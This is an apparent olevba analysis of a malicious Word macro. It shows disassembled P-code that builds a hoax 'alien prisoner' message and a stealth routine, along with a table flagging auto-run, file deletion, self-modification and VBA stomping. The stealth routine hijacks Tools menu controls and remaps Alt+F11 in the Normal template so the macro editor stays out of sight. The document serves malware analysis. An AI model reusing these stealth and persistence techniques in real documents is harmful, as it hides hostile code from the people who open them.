' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0018 "i do not have much time "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt strTexts 0x0001 
' Line #220:
' Line #221:
' 	LitDI2 0x0005 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #222:
' 	LitDI2 0x0005 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0023 "so i can't tell you much about our "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt strTexts 0x0001 
' Line #223:
' 	LitDI2 0x0005 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "situation, but know: we're many, "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt strTexts 0x0001 
' Line #224:
' 	LitDI2 0x0005 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x001F "we're well up but we are prison"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt strTexts 0x0001 
' Line #225:
' Line #226:
' 	LitDI2 0x0006 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #227:
' 	LitDI2 0x0006 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "ers. if you receive this message "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt strTexts 0x0001 
' Line #228:
' 	LitDI2 0x0006 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0024 "plese tell the nasa, the nsa and all"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt strTexts 0x0001 
' Line #229:
' 	LitDI2 0x0006 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0022 "other relevant organizations, taht"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt strTexts 0x0001 
' Line #230:
' Line #231:
' 	LitDI2 0x0007 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #232:
' 	LitDI2 0x0007 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0022 "they're here. we don't knoe their "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt strTexts 0x0001 
' Line #233:
' 	LitDI2 0x0007 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "intentions, but they're grabbing "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt strTexts 0x0001 
' Line #234:
' 	LitDI2 0x0007 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0011 "more and more hum"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt strTexts 0x0001 
' Line #235:
' Line #236:
' 	LitDI2 0x0008 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #237:
' 	LitDI2 0x0008 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0024 "ans from earth. we need you're help "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsSt strTexts 0x0001 
' Line #238:
' 	LitDI2 0x0008 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "!!! and you will also need help, "
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsSt strTexts 0x0001 
' Line #239:
' 	LitDI2 0x0008 
' 	ArgsLd strTexts 0x0001 
' 	LitStr 0x0021 "mankind definetley relies on prot"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsSt strTexts 0x0001 
' Line #240:
' Line #241:
' 	LitDI2 0x0009 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #242:
' 	LitDI2 0x000A 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #243:
' 	LitDI2 0x000B 
' 	ArgsCall GenerateRndChars 0x0001 
' Line #244:
' Line #245:
' 	EndSub 
' Line #246:
' Line #247:
' 	FuncDefn (Sub InitStealth())
' Line #248:
' Line #249:
' 	Dim 
' 	VarDefn c (As Variant)
' Line #250:
' Line #251:
' 	QuoteRem 0x0004 0x0014 "On Error Resume Next"
' Line #252:
' Line #253:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #254:
' 	Ld c 
' 	MemLd ID 
' 	LitDI2 0x7541 
' 	Eq 
' 	IfBlock 
' Line #255:
' 	LitStr 0x000A "ShowMsgBox"
' 	LitDI2 0x0001 
' 	Ld c 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #256:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0002 
' 	Ld c 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #257:
' 	LitStr 0x000A "ShowMsgBox"
' 	LitDI2 0x0003 
' 	Ld c 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #258:
' 	QuoteRem 0x0000 0x001E "        ElseIf c.ID = 797 Then"
' Line #259:
' 	QuoteRem 0x0000 0x0025 "            c.OnAction = "ShowMsgBox""
' Line #260:
' 	QuoteRem 0x0000 0x001E "        ElseIf c.ID = 751 Then"
' Line #261:
' 	QuoteRem 0x0000 0x0025 "            c.OnAction = "ShowMsgBox""
' Line #262:
' 	EndIfBlock 
' Line #263:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #264:
' Line #265:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #266:
' 	LineCont 0x0004 0C 00 08 00
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0007 "FileNew"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #267:
' 	LineCont 0x0008 0B 00 08 00 12 00 08 00
' 	Ld wdKeyNumeric0 
' 	Ld wdKeyControl 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0003 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000B "SpookIsOver"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #268:
' Line #269:
' 	EndSub 
' Line #270:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

